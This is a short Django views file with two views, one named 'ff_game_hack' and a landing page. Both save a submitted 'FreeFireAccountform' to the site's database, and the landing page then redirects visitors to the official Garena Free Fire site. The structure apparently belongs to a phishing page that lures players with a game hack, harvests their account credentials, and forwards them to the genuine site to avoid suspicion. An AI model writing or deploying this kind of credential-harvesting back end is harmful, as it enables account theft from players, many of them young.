from django.shortcuts import render, redirect
from page.forms import FreeFireAccountform

def ff_game_hack(request):
    if request.method == 'POST':
        form = FreeFireAccountform(request.POST or None)
        if form.is_valid():
            form.save()
            return redirect('home')

def landing_page(request):
    form = FreeFireAccountform()
    if request.method == 'POST':
        form = FreeFireAccountform(request.POST or None)
        if form.is_valid():
            form.save()
            return redirect('https://ff.garena.com/')
    return render(request, 'index.html', {'form': form})
